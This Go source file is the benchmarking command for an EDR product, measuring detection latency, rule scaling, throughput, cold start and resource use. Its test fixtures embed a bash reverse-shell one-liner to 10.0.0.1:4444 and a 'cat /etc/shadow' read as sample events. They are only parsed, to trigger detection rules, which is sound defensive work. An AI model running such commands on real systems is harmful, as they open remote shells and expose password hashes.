// Command banken-bench measures the numbers docs/design/benchmarking.md says an
// EDR is judged by, and writes them as the raw JSON the README Performance table
// is built from. Every latency number is a distribution (p50/p99/max), never a
// mean, per the spec.
//
// Each subcommand is one spec category. The ones that run in-process on any box
// (detection latency stages t3..t5, rule scaling, rule load/compile, match
// throughput, cold start, the fork-exec baseline) produce measured numbers now.
// The ones that need a long soak, a reboot, the live mimi sensor, a fork bomb or
// a competitor install are wired as the same subcommand with a longer duration
// or an environment flag, and are reported as pending until the matrix harness
// (tests/bench.nix) runs them -- never filled with an invented number.
//
//	banken-bench all      -rules ./rules [-bin ./banken] -out run.json
//	banken-bench latency  -rules ./rules
//	banken-bench rulescale -rules ./rules
//	banken-bench ruleload -rules ./rules
//	banken-bench throughput -rules ./rules
//	banken-bench coldstart -bin ./banken
//	banken-bench forkexec -n 5000
//	banken-bench sample   -pid 1234 -duration 10s
//	banken-bench footprint -bin ./banken
package main

import (
	"bufio"
	"bytes"
	"errors"
	"flag"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/conor-sometimes/banken/bench/benchlib"
	"github.com/conor-sometimes/banken/internal/alert"
	"github.com/conor-sometimes/banken/internal/engine"
	"github.com/conor-sometimes/banken/internal/event"
	"github.com/conor-sometimes/banken/internal/parser"
	"github.com/conor-sometimes/banken/internal/sigma"
)

// scaleCounts is the rule-count axis the spec names (the baseline plus the two
// large points); the baseline row uses the real shipped tree, padded up to the
// larger counts.
var scaleCounts = []int{2000, 10000}

// A mimi exec line that fires the shipped reverse_shell rule (CommandLine
// contains /dev/tcp/), so the match and OCSF stages run on a real alert.
const mimiThreat = `{"schema":"mimi/2","kind":"exec","time":"2026-11-02T00:00:00Z","capture_ns":0,"activity_id":1,` +
	`"process":{"pid":4242,"name":"bash","cmd_line":"bash -c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",` +
	`"file":{"path":"/usr/bin/bash","name":"bash"},"user":{"uid":"1000","gid":"1000"},` +
	`"parent_process":{"pid":4000,"name":"sshd"}},` +
	`"ancestry":[{"pid":4242,"name":"bash"},{"pid":4000,"name":"sshd"},{"pid":1,"name":"systemd"}]}` + "\n"

// A benign exec line that fires nothing: the common case on a quiet host.
const mimiClean = `{"schema":"mimi/2","kind":"exec","time":"2026-11-02T00:00:00Z","capture_ns":0,"activity_id":2,` +
	`"process":{"pid":4243,"name":"ls","cmd_line":"ls -la /home/user","file":{"path":"/usr/bin/ls","name":"ls"},` +
	`"user":{"uid":"1000","gid":"1000"},"parent_process":{"pid":4100,"name":"fish"}}}` + "\n"

// sinks keep the compiler from eliding the measured work.
var (
	sinkEvents []event.Event
	sinkAlerts []alert.Alert
	sinkBytes  []byte
	sinkInt    int
)

// sinkEvents, sinkAlerts and sinkInt are write-only by design: their stores are what stop the compiler
// eliding the measured work. This reference marks them used for staticcheck (U1000) without reading
// them in the measured loops.
var _, _, _ = sinkEvents, sinkAlerts, sinkInt

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintln(os.Stderr, "usage: banken-bench <all|latency|rulescale|ruleload|throughput|coldstart|forkexec|sample|footprint> [flags]")
		os.Exit(2)
	}
	cmd := os.Args[1]
	args := os.Args[2:]

	var (
		sections []benchlib.Section
		platform string
		out      string
		err      error
	)
	switch cmd {
	case "all":
		sections, platform, out, err = runAll(args)
	case "latency":
		var s benchlib.Section
		fs := newFS(cmd)
		rules := fs.String("rules", "./rules", "shipped rule tree to load")
		iters := fs.Int("iters", 50000, "measured iterations per stage")
		platform, out = commonFlags(fs, args)
		s, err = latency(*rules, *iters)
		sections = []benchlib.Section{s}
	case "rulescale":
		fs := newFS(cmd)
		rules := fs.String("rules", "./rules", "shipped rule tree to load")
		iters := fs.Int("iters", 50000, "measured iterations per rule count")
		platform, out = commonFlags(fs, args)
		var s benchlib.Section
		s, err = rulescale(*rules, *iters)
		sections = []benchlib.Section{s}
	case "ruleload":
		fs := newFS(cmd)
		rules := fs.String("rules", "./rules", "shipped rule tree to load")
		iters := fs.Int("iters", 50, "matcher builds per rule count")
		platform, out = commonFlags(fs, args)
		var s benchlib.Section
		s, err = ruleload(*rules, *iters)
		sections = []benchlib.Section{s}
	case "throughput":
		fs := newFS(cmd)
		rules := fs.String("rules", "./rules", "shipped rule tree to load")
		dur := fs.Duration("duration", 3*time.Second, "how long to run the match loop")
		queueCap := fs.Int("queue", 1024, "bounded queue depth (models the ring buffer)")
		platform, out = commonFlags(fs, args)
		var s benchlib.Section
		s, err = throughput(*rules, *dur, *queueCap)
		sections = []benchlib.Section{s}
	case "coldstart":
		fs := newFS(cmd)
		bin := fs.String("bin", "", "path to a built banken binary (required)")
		rules := fs.String("rules", "./rules", "rule tree for the spawned banken")
		reps := fs.Int("reps", 20, "process spawns to time")
		platform, out = commonFlags(fs, args)
		var s benchlib.Section
		s, err = coldstart(*bin, *rules, *reps)
		sections = []benchlib.Section{s}
	case "forkexec":
		fs := newFS(cmd)
		n := fs.Int("n", 5000, "exec iterations")
		cmdPath := fs.String("cmd", "/bin/true", "program to exec in the loop")
		platform, out = commonFlags(fs, args)
		var s benchlib.Section
		s, err = forkexec(*n, *cmdPath)
		sections = []benchlib.Section{s}
	case "sample":
		fs := newFS(cmd)
		pid := fs.Int("pid", 0, "process to sample (required)")
		dur := fs.Duration("duration", 5*time.Second, "sampling window")
		interval := fs.Duration("interval", 500*time.Millisecond, "sampling interval")
		label := fs.String("label", "process", "what the sampled process is")
		platform, out = commonFlags(fs, args)
		var s benchlib.Section
		s, err = sample(*pid, *dur, *interval, *label)
		sections = []benchlib.Section{s}
	case "footprint":
		fs := newFS(cmd)
		bin := fs.String("bin", "", "path to a built, stripped banken binary (required)")
		mods := fs.Int("modules", 0, "transitive module count (from `go list -m all`); run.sh fills it")
		pkgs := fs.Int("thirdparty-packages", 0, "third-party packages linked into the binary; run.sh fills it")
		srcBytes := fs.Int("source-bytes", 0, "total third-party source bytes under audit; run.sh fills it")
		platform, out = commonFlags(fs, args)
		var s benchlib.Section
		s, err = footprint(*bin, *mods, *pkgs, *srcBytes)
		sections = []benchlib.Section{s}
	default:
		fmt.Fprintf(os.Stderr, "unknown subcommand %q\n", cmd)
		os.Exit(2)
	}
	if err != nil {
		fmt.Fprintf(os.Stderr, "banken-bench %s: %v\n", cmd, err)
		os.Exit(1)
	}

	run := benchlib.Run{
		Tool:      "banken-bench " + cmd,
		Generated: time.Now().UTC(),
		Platform:  platform,
		Host:      benchlib.DetectHost(),
		Sections:  sections,
	}
	if err := emit(run, out); err != nil {
		fmt.Fprintf(os.Stderr, "writing output: %v\n", err)
		os.Exit(1)
	}
}

func newFS(name string) *flag.FlagSet {
	fs := flag.NewFlagSet(name, flag.ExitOnError)
	return fs
}

// commonFlags registers -platform and -out on fs, parses args, and returns them.
func commonFlags(fs *flag.FlagSet, args []string) (platform, out string) {
	p := fs.String("platform", "", "matrix row label (distro name); empty for a direct host run")
	o := fs.String("out", "", "write JSON here; empty is stdout")
	_ = fs.Parse(args)
	return *p, *o
}

func emit(run benchlib.Run, out string) error {
	if out == "" {
		return run.Write(os.Stdout)
	}
	f, err := os.Create(out) // #nosec G703 -- operator-supplied -out path to a dev bench tool
	if err != nil {
		return err
	}
	defer func() { _ = f.Close() }()
	if err := run.Write(f); err != nil {
		return err
	}
	fmt.Fprintf(os.Stderr, "wrote %s\n", out)
	return nil
}

// runAll runs every fast category and appends pending stubs for the heavy ones,
// so one JSON file describes the whole suite: measured where it can be, honestly
// pending where it cannot.
func runAll(args []string) ([]benchlib.Section, string, string, error) {
	fs := newFS("all")
	rules := fs.String("rules", "./rules", "shipped rule tree to load")
	bin := fs.String("bin", "", "built banken binary (enables coldstart + footprint)")
	iters := fs.Int("iters", 50000, "measured iterations for the micro-benches")
	platform, out := commonFlags(fs, args)

	var secs []benchlib.Section
	add := func(s benchlib.Section, e error) error {
		if e != nil {
			return e
		}
		secs = append(secs, s)
		return nil
	}
	if err := add(latency(*rules, *iters)); err != nil {
		return nil, "", "", err
	}
	if err := add(rulescale(*rules, *iters)); err != nil {
		return nil, "", "", err
	}
	if err := add(ruleload(*rules, 50)); err != nil {
		return nil, "", "", err
	}
	if err := add(throughput(*rules, 3*time.Second, 1024)); err != nil {
		return nil, "", "", err
	}
	if err := add(forkexec(5000, "/bin/true")); err != nil {
		return nil, "", "", err
	}
	if *bin != "" {
		if err := add(coldstart(*bin, *rules, 20)); err != nil {
			return nil, "", "", err
		}
		if err := add(footprint(*bin, 0, 0, 0)); err != nil {
			return nil, "", "", err
		}
	} else {
		secs = append(secs,
			pending("startup-recovery", "cold start: pass -bin <banken> to measure process-start-to-first-finding"),
			pending("footprint", "pass -bin <stripped banken> for binary size; run.sh fills dependency/source counts"))
	}
	secs = append(secs, heavyPending()...)
	return secs, platform, out, nil
}

// heavyPending lists the spec categories the matrix harness runs after a rebuild:
// each is a real benchmark, just not one this environment may run now.
func heavyPending() []benchlib.Section {
	return []benchlib.Section{
		pending("detection-latency-t1-t2", "sensor capture (t1) and transport (t2): need the live mimi eBPF sensor; measured from mimi's capture_ns to banken receive time under tests/bench.nix"),
		pending("resource-cost-idle-24h", "idle CPU+RSS over 24h: `banken-bench sample -pid <bankend> -duration 24h`; needs the daemon running and the soak window"),
		pending("resource-cost-kernel-build", "CPU+RSS under a kernel build with/without banken: run.sh kernelbuild target inside the VM"),
		pending("backpressure-forkbomb", "events/sec before the ring buffer drops + burst clear time: needs mimi under a fork bomb (silent loss is the classic EDR failure; counted explicitly)"),
		pending("sensor-overhead-attached", "added us/exec with the mimi probe attached vs the forkexec baseline; wall-time slowdown of a real job (kernel build/npm/test) with vs without mimi"),
		pending("startup-boot-to-finding", "boot-to-first-finding after reboot, and backlog replay after an hour stopped: VM reboot + downtime, under tests/bench.nix"),
		pending("detection-quality-fp", "false positives per host per day by rule on a benign workload; per-rule eval cost: needs the benign-workload corpus run in the VM"),
		pending("competitor-comparison", "auditd+ausearch / Falco / Wazuh / osquery on the same events: a peer number for scale; installed and run by the matrix harness"),
	}
}

func pending(category, note string) benchlib.Section {
	return benchlib.Section{Category: category, Status: benchlib.StatusPending, Note: note}
}

// --- detection latency, staged (t3 normalise, t4 match, t5 OCSF build+write) ---

func latency(rulesDir string, iters int) (benchlib.Section, error) {
	rules, err := benchlib.LoadBaseline(rulesDir)
	if err != nil {
		return benchlib.Section{}, err
	}
	eng := engine.New(rules, nil, nil)
	mimi := parser.Mimi{}
	enc := alert.EncodeOCSF(alert.OCSFOptions{ProductVersion: "bench", Hostname: "bench-host"})
	sink := bufio.NewWriter(io.Discard)

	sec := benchlib.Section{
		Category: "detection-latency",
		Status:   benchlib.StatusMeasured,
		Note:     fmt.Sprintf("t3 normalise (mimi parse), t4 prefilter+match, t5 OCSF build+write, and end-to-end t3..t5, against the real %d-rule shipped tree. t1 (sensor capture) and t2 (transport) need the live mimi sensor -- see detection-latency-t1-t2 (pending).", len(rules)),
	}

	for _, c := range []struct {
		label string
		line  string
	}{{"threat", mimiThreat}, {"clean", mimiClean}} {
		lineBytes := []byte(c.line)

		// Precompute the event for the match/ocsf stages so each stage times
		// only its own work.
		evs, _ := mimi.Parse(bytes.NewReader(lineBytes))
		if len(evs) == 0 {
			return benchlib.Section{}, fmt.Errorf("latency: %s line parsed to no event", c.label)
		}
		ev := evs[0]
		alerts := eng.Match(ev)
		fired := len(alerts)
		if c.label == "threat" && fired == 0 {
			return benchlib.Section{}, errors.New("latency: threat line fired no rule; the bench needs a real alert for t5")
		}
		// t5 needs an alert object; use the live one for the threat, a
		// representative one for the clean case (OCSF cost is shape-driven).
		a := representativeAlert(ev)
		if fired > 0 {
			a = alerts[0]
		}

		extra := map[string]any{"line": c.label, "rulesFired": fired}

		t3 := benchlib.Measure(iters, func() {
			sinkEvents, _ = mimi.Parse(bytes.NewReader(lineBytes))
		})
		t4 := benchlib.Measure(iters, func() {
			sinkAlerts = eng.Match(ev)
		})
		t5 := benchlib.Measure(iters, func() {
			sinkBytes, _ = enc(a)
			_, _ = sink.Write(sinkBytes)
			sink.Reset(io.Discard)
		})
		e2e := benchlib.Measure(iters, func() {
			es, _ := mimi.Parse(bytes.NewReader(lineBytes))
			for _, e := range es {
				for _, al := range eng.Match(e) {
					sinkBytes, _ = enc(al)
					_, _ = sink.Write(sinkBytes)
				}
			}
			sink.Reset(io.Discard)
		})

		sec.Metrics = append(
			sec.Metrics,
			benchlib.Dist("t3-normalise-"+c.label, "ns", t3, extra),
			benchlib.Dist("t4-match-"+c.label, "ns", t4, extra),
			benchlib.Dist("t5-ocsf-write-"+c.label, "ns", t5, extra),
			benchlib.Dist("e2e-t3-t5-"+c.label, "ns", e2e, extra),
		)
	}
	return sec, nil
}

func representativeAlert(ev event.Event) alert.Alert {
	return alert.Alert{
		Time: time.Now(), Kind: alert.KindSigma, Rule: "reverse_shell",
		Title: "Reverse shell one-liner", Level: "high", Source: ev.Source,
		Tags: []string{"attack.command_and_control", "attack.t1059"}, Event: ev,
	}
}

// --- rule scaling: match time + allocs per event vs rule count ---

func rulescale(rulesDir string, iters int) (benchlib.Section, error) {
	baseline, err := benchlib.LoadBaseline(rulesDir)
	if err != nil {
		return benchlib.Section{}, err
	}
	sec := benchlib.Section{
		Category: "rule-scaling",
		Status:   benchlib.StatusMeasured,
		Note:     "match time per event and allocations per event vs rule count. The prefilter makes per-event cost near-flat; allocs/event are constant by design.",
	}
	evs, _ := parser.Mimi{}.Parse(bytes.NewReader([]byte(mimiThreat)))
	ev := evs[0]

	counts := append([]int{len(baseline)}, scaleCounts...)
	for _, n := range counts {
		rules, err := benchlib.PadTo(baseline, n)
		if err != nil {
			return benchlib.Section{}, err
		}
		m := sigma.NewMatcher(rules)
		actual := len(rules)
		st := benchlib.Measure(iters, func() {
			sinkInt = len(m.Match(ev))
		})
		allocs := allocsPerCall(func() { sinkInt = len(m.Match(ev)) })
		label := "match-at-" + strconv.Itoa(actual) + "-rules"
		sec.Metrics = append(sec.Metrics, benchlib.Dist(label, "ns", st, map[string]any{
			"ruleCount": actual, "allocsPerEvent": allocs,
		}))
	}
	return sec, nil
}

// --- rule load + compile time, memory per rule ---

func ruleload(rulesDir string, iters int) (benchlib.Section, error) {
	baseline, err := benchlib.LoadBaseline(rulesDir)
	if err != nil {
		return benchlib.Section{}, err
	}
	sec := benchlib.Section{
		Category: "rule-load",
		Status:   benchlib.StatusMeasured,
		Note:     "time to compile a rule set into the Aho-Corasick matcher, and the matcher's resident bytes per rule. LoadTree (YAML parse from disk) is measured once for the baseline.",
	}

	// Disk load of the real tree (parse YAML -> rules), measured a few times.
	loadStat := benchlib.Measure(min(iters, 50), func() {
		rs, _ := sigma.LoadTree(rulesDir)
		sinkInt = len(rs)
	})
	sec.Metrics = append(sec.Metrics, benchlib.Dist("loadtree-baseline", "ns", loadStat,
		map[string]any{"ruleCount": len(baseline)}))

	counts := append([]int{len(baseline)}, scaleCounts...)
	for _, n := range counts {
		rules, err := benchlib.PadTo(baseline, n)
		if err != nil {
			return benchlib.Section{}, err
		}
		actual := len(rules)
		st := benchlib.Measure(min(iters, 200), func() {
			m := sigma.NewMatcher(rules)
			sinkInt = m.Len()
		})
		bytesPerRule := matcherBytes(rules) / int64(actual)
		sec.Metrics = append(sec.Metrics, benchlib.Dist("compile-at-"+strconv.Itoa(actual)+"-rules", "ns", st,
			map[string]any{"ruleCount": actual, "bytesPerRule": bytesPerRule}))
	}
	return sec, nil
}

// matcherBytes estimates the resident bytes a compiled matcher adds, by the heap
// delta across building it while keeping it alive. It is a measurement, not a
// model: GC is forced before and after so the delta is live memory, not float.
func matcherBytes(rules []*sigma.Rule) int64 {
	runtime.GC()
	var before, after runtime.MemStats
	runtime.ReadMemStats(&before)
	m := sigma.NewMatcher(rules)
	runtime.GC()
	runtime.ReadMemStats(&after)
	sinkInt = m.Len()                                     // keep m alive past the second reading
	d := int64(after.HeapAlloc) - int64(before.HeapAlloc) // #nosec G115 -- heap byte counts are far below 2^63
	if d < 0 {
		d = 0
	}
	return d
}

// --- throughput + explicit drop counting (in-process model) ---

func throughput(rulesDir string, dur time.Duration, queue int) (benchlib.Section, error) {
	rules, err := benchlib.LoadBaseline(rulesDir)
	if err != nil {
		return benchlib.Section{}, err
	}
	eng := engine.New(rules, nil, nil)
	evs, _ := parser.Mimi{}.Parse(bytes.NewReader([]byte(mimiClean))) // quiet-host common case
	ev := evs[0]

	// Sustained single-core match rate: saturate one core for dur, count events.
	var processed int64
	deadline := time.Now().Add(dur)
	start := time.Now()
	for time.Now().Before(deadline) {
		for i := 0; i < 1000; i++ {
			sinkInt = len(eng.Match(ev))
		}
		processed += 1000
	}
	elapsed := time.Since(start)
	eps := float64(processed) / elapsed.Seconds()

	// Bounded-queue drop demo: a producer floods a queue of depth `queue`; a
	// single consumer drains it by matching. A non-blocking send that finds the
	// queue full is a DROP, counted -- the discipline the spec insists on (a
	// sensor that silently loses events under load is the classic EDR failure).
	dropped, consumed := dropDemo(eng, ev, queue, dur/2)

	sec := benchlib.Section{
		Category: "throughput",
		Status:   benchlib.StatusMeasured,
		Note:     "sustained single-core match rate (events/sec through prefilter+match), and a bounded-queue drop demo that counts dropped events explicitly. The ring-buffer-under-fork-bomb test needs the live mimi sensor -- see backpressure-forkbomb (pending).",
		Metrics: []benchlib.Metric{
			benchlib.Scalar("sustained-match-rate", "events/sec", eps, map[string]any{
				"processed": processed, "elapsedMs": elapsed.Milliseconds(), "cores": 1,
			}),
			benchlib.Scalar("drop-demo-dropped", "events", float64(dropped), map[string]any{
				"queueDepth": queue, "consumed": consumed,
				"dropRate": ratio(dropped, dropped+consumed),
			}),
		},
	}
	return sec, nil
}

func dropDemo(eng *engine.Engine, ev event.Event, queue int, dur time.Duration) (dropped, consumed int64) {
	q := make(chan event.Event, queue)
	done := make(chan struct{})
	go func() { // consumer
		for e := range q {
			sinkInt = len(eng.Match(e))
			consumed++
		}
		close(done)
	}()
	deadline := time.Now().Add(dur)
	for time.Now().Before(deadline) {
		select {
		case q <- ev:
		default:
			dropped++ // queue full: a real sensor would lose this event
		}
	}
	close(q)
	<-done
	return dropped, consumed
}

// --- cold start: process start to first finding on disk ---

func coldstart(bin, rulesDir string, reps int) (benchlib.Section, error) {
	if bin == "" {
		return benchlib.Section{}, errors.New("coldstart needs -bin <built banken binary>")
	}
	absBin, err := filepath.Abs(bin)
	if err != nil {
		return benchlib.Section{}, err
	}
	// A one-line laurel log carrying a threat known to fire (cat /etc/shadow).
	const threat = `{"ID":"1.000:1","SYSCALL":{"exe":"/usr/bin/cat","uid":"0"},"EXECVE":{"argc":"2","ARGV":["cat","/etc/shadow"]},"PATH":[{"name":"/etc/shadow"}]}` + "\n"

	samples := make([]int64, 0, reps)
	var fired int
	for i := 0; i < reps; i++ {
		dir, err := os.MkdirTemp("", "banken-coldstart")
		if err != nil {
			return benchlib.Section{}, err
		}
		logPath := filepath.Join(dir, "audit.jsonl")
		findDir := filepath.Join(dir, "findings")
		cfgPath := filepath.Join(dir, "banken.yml")
		if err := os.WriteFile(logPath, []byte(threat), 0o600); err != nil {
			return benchlib.Section{}, err
		}
		cfg := fmt.Sprintf("rules: [%s]\nstatePath: %s\nsources:\n  - type: laurel\n    path: %s\nalerts:\n  jsonl:\n    enable: true\n    dir: %s\n",
			rulesDir, filepath.Join(dir, "state.json"), logPath, findDir)
		if err := os.WriteFile(cfgPath, []byte(cfg), 0o600); err != nil { // #nosec G703 -- config file inside the bench-owned temp dir
			return benchlib.Section{}, err
		}

		start := time.Now()
		c := exec.Command(absBin, "-config", cfgPath) // #nosec G702,G204 -- operator-supplied banken binary run on purpose; a dev bench tool
		c.Dir = dir
		var stderr bytes.Buffer
		c.Stderr = &stderr
		if err := c.Run(); err != nil {
			return benchlib.Section{}, fmt.Errorf("coldstart run: %w (stderr: %s)", err, strings.TrimSpace(stderr.String()))
		}
		elapsed := time.Since(start).Nanoseconds()
		if findingWritten(findDir) {
			fired++
		}
		samples = append(samples, elapsed)
		_ = os.RemoveAll(dir)
	}
	st := statsFrom(samples)
	return benchlib.Section{
		Category: "startup-recovery",
		Status:   benchlib.StatusMeasured,
		Note:     "cold start: wall time from banken process start to the first finding written to disk, one-shot scan of a 1-line log. Boot-to-first-finding after reboot and backlog replay are the VM versions (startup-boot-to-finding, pending).",
		Metrics: []benchlib.Metric{
			benchlib.Dist("process-start-to-first-finding", "ns", st, map[string]any{
				"reps": reps, "repsThatFired": fired,
			}),
		},
	}, nil
}

func findingWritten(dir string) bool {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return false
	}
	for _, e := range entries {
		if info, err := e.Info(); err == nil && info.Size() > 0 {
			return true
		}
	}
	return false
}

// --- sensor-overhead baseline: us/exec in a tight fork-exec loop (probe off) ---

func forkexec(n int, cmdPath string) (benchlib.Section, error) {
	if _, err := os.Stat(cmdPath); err != nil { // #nosec G703 -- operator-supplied command path to a dev bench tool
		return benchlib.Section{}, fmt.Errorf("forkexec: %s not found: %w", cmdPath, err)
	}
	samples := make([]int64, 0, n)
	for i := 0; i < n; i++ {
		start := time.Now()
		if err := exec.Command(cmdPath).Run(); err != nil { // #nosec G702 -- operator-supplied command run on purpose; a dev bench tool
			return benchlib.Section{}, fmt.Errorf("forkexec iteration: %w", err)
		}
		samples = append(samples, time.Since(start).Nanoseconds())
	}
	st := statsFrom(samples)
	return benchlib.Section{
		Category: "sensor-overhead-baseline",
		Status:   benchlib.StatusMeasured,
		Note:     "per-exec wall time with NO sensor attached (the probe-detached baseline). The added us/exec with the mimi probe attached is sensor-overhead-attached (pending): subtract this baseline from that run.",
		Metrics: []benchlib.Metric{
			benchlib.Dist("fork-exec-no-probe", "ns", st, map[string]any{"iterations": n, "cmd": cmdPath}),
		},
	}, nil
}

// --- resource sampling: RSS + CPU of a running process over a window ---

func sample(pid int, dur, interval time.Duration, label string) (benchlib.Section, error) {
	if pid <= 0 {
		return benchlib.Section{}, errors.New("sample needs -pid <running process>")
	}
	if runtime.GOOS != "linux" {
		return benchlib.Section{}, errors.New("sample reads /proc; Linux only")
	}
	rss := make([]int64, 0)
	var cpu []int64
	prevTicks, prevT, havePrev := int64(0), time.Now(), false

	deadline := time.Now().Add(dur)
	for time.Now().Before(deadline) {
		r, err := readRSSBytes(pid)
		if err != nil {
			return benchlib.Section{}, err
		}
		rss = append(rss, r)
		ticks, now := readProcTicks(pid), time.Now()
		if havePrev {
			dt := now.Sub(prevT).Seconds()
			if dt > 0 {
				// CPU percent = delta ticks / CLK_TCK / dt * 100; CLK_TCK is 100
				// on Linux (reported in Extra so the reader can rescale).
				pct := float64(ticks-prevTicks) / 100.0 / dt * 100.0
				cpu = append(cpu, int64(pct*1000)) // milli-percent, integer for Stats
			}
		}
		prevTicks, prevT, havePrev = ticks, now, true
		time.Sleep(interval)
	}
	rssStat := statsFrom(rss)
	cpuStat := statsFrom(cpu)
	return benchlib.Section{
		Category: "resource-cost",
		Status:   benchlib.StatusMeasured,
		Note:     fmt.Sprintf("RSS and CPU of %s (pid %d) sampled every %s over %s. The idle-24h and under-kernel-build rows are this same command with a longer window and the right workload (resource-cost-idle-24h / resource-cost-kernel-build, pending).", label, pid, interval, dur),
		Metrics: []benchlib.Metric{
			benchlib.Dist("rss", "bytes", rssStat, map[string]any{"label": label, "samples": len(rss)}),
			benchlib.Dist("cpu", "milli-percent", cpuStat, map[string]any{"label": label, "clkTck": 100, "samples": len(cpu)}),
		},
	}, nil
}

func readRSSBytes(pid int) (int64, error) {
	b, err := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid)) // #nosec G703 -- path built from an integer pid
	if err != nil {
		return 0, err
	}
	for _, line := range strings.Split(string(b), "\n") {
		if rest, ok := strings.CutPrefix(line, "VmRSS:"); ok {
			rest = strings.TrimSpace(strings.TrimSuffix(strings.TrimSpace(rest), "kB"))
			kb, err := strconv.ParseInt(strings.TrimSpace(rest), 10, 64)
			if err != nil {
				return 0, err
			}
			return kb * 1024, nil
		}
	}
	return 0, fmt.Errorf("VmRSS not found for pid %d", pid)
}

func readProcTicks(pid int) int64 {
	b, err := os.ReadFile(fmt.Sprintf("/proc/%d/stat", pid)) // #nosec G703 -- path built from an integer pid
	if err != nil {
		return 0
	}
	// Fields after the (comm) are space separated; utime=14, stime=15 (1-based)
	// counting from the field after the closing paren.
	s := string(b)
	rparen := strings.LastIndexByte(s, ')')
	if rparen < 0 {
		return 0
	}
	fields := strings.Fields(s[rparen+1:])
	// fields[0] is state; utime is fields[11], stime fields[12] here.
	if len(fields) < 13 {
		return 0
	}
	utime, _ := strconv.ParseInt(fields[11], 10, 64)
	stime, _ := strconv.ParseInt(fields[12], 10, 64)
	return utime + stime
}

// --- footprint: static binary size, dependency + source byte counts ---

func footprint(bin string, modules, thirdPartyPkgs, sourceBytes int) (benchlib.Section, error) {
	if bin == "" {
		return benchlib.Section{}, errors.New("footprint needs -bin <stripped banken binary>")
	}
	info, err := os.Stat(bin) // #nosec G703 -- operator-supplied -bin path to a dev bench tool
	if err != nil {
		return benchlib.Section{}, err
	}
	sec := benchlib.Section{
		Category: "footprint",
		Status:   benchlib.StatusMeasured,
		Note:     "static stripped binary size, and the transitive dependency and source-byte counts under audit. The counts are passed in by run.sh (go list); 0 means run.sh did not compute them this invocation.",
		Metrics: []benchlib.Metric{
			benchlib.Scalar("binary-size", "bytes", float64(info.Size()), map[string]any{"path": bin}),
		},
	}
	if modules > 0 {
		sec.Metrics = append(sec.Metrics, benchlib.Scalar("transitive-modules", "count", float64(modules), nil))
	}
	if thirdPartyPkgs > 0 {
		sec.Metrics = append(sec.Metrics, benchlib.Scalar("thirdparty-packages-linked", "count", float64(thirdPartyPkgs), nil))
	}
	if sourceBytes > 0 {
		sec.Metrics = append(sec.Metrics, benchlib.Scalar("thirdparty-source", "bytes", float64(sourceBytes), nil))
	}
	return sec, nil
}

// --- small helpers ---

func statsFrom(samples []int64) benchlib.Stats {
	// The samples are already measured (coldstart, forkexec, sample), so the
	// distribution is computed directly rather than through Measure's timing.
	return benchlib.StatsFromSamples(samples)
}

// allocsPerCall counts heap allocations per call via the cumulative Mallocs
// counter, which GC does not reset, so the delta over a fixed run is the honest
// allocs/op the spec's "allocations per event are constant" claim rests on.
func allocsPerCall(fn func()) float64 {
	const runs = 1000
	runtime.GC()
	var m0, m1 runtime.MemStats
	runtime.ReadMemStats(&m0)
	for i := 0; i < runs; i++ {
		fn()
	}
	runtime.ReadMemStats(&m1)
	return float64(m1.Mallocs-m0.Mallocs) / runs
}

func ratio(a, b int64) float64 {
	if b == 0 {
		return 0
	}
	return float64(a) / float64(b)
}
